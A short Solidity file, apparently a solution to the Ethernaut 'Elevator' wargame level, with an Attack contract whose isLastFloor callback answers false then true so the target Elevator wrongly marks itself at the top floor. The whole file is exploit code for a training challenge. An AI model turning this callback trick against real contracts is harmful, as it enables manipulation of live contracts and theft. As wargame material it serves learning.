//SPDX-License-Identifier:MIT

import ".Elevator.sol";

pragma solidity ^0.6.0;

contract Attack{
    Elevator public elevator;

    constructor(address _elevatorAddress) public{
        elevator = Elevator(_elevatorAddress);
    }

    function isLastFloor(uint) view external returns(bool){
        if(elevator.floor() == 0){
            return false;
        }else{
            return true;
        }
    }

    function callLift(uint _floor) public{
        elevator.goTo(_floor);
    }
}